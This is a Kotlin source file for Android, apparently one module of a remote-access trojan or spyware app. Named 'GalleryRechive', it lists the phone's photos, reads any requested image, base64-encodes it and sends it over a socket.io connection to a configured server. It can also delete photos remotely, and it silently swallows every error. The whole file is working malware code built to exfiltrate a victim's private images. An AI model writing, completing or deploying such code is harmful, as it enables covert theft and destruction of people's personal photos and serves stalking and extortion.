package com.app.cyber

import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.MediaStore
import android.util.Base64
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object GalleryRechive {
    private var socket: Socket? = null

    fun listImages(ctx: Context) {
        val result = JSONArray()
        val cursor = ctx.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED),
            null, null,
            MediaStore.Images.Media.DATE_ADDED + " DESC"
        )
        cursor?.use {
            val idCol = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val dateCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
            while (it.moveToNext() && result.length() < 500) {
                val o = JSONObject()
                o.put("id", it.getLong(idCol))
                o.put("name", it.getString(nameCol) ?: "unknown")
                o.put("date", it.getLong(dateCol))
                result.put(o)
            }
        }
        val payload = JSONObject()
        payload.put("action", "gallery_list")
        payload.put("data", result)
        emit(ctx, payload)
    }

    fun sendImage(ctx: Context, idStr: String) {
        try {
            val id = idStr.toLongOrNull() ?: return
            val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
            val input = ctx.contentResolver.openInputStream(uri) ?: return
            val bytes = input.readBytes()
            input.close()
            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            val payload = JSONObject()
            payload.put("action", "gallery_get")
            payload.put("id", idStr)
            payload.put("data", b64)
            emit(ctx, payload)
        } catch (e: Exception) { }
    }

    fun deleteImage(ctx: Context, idStr: String) {
        try {
            val id = idStr.toLongOrNull() ?: return
            val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
            ctx.contentResolver.delete(uri, null, null)
        } catch (e: Exception) { }
    }

    private fun emit(ctx: Context, payload: JSONObject) {
        try {
            if (socket == null || !socket!!.connected()) {
                socket = IO.socket(Config.BaseUrl)
                socket?.connect()
            }
            socket?.emit("device-data", payload)
        } catch (e: Exception) { }
    }
}
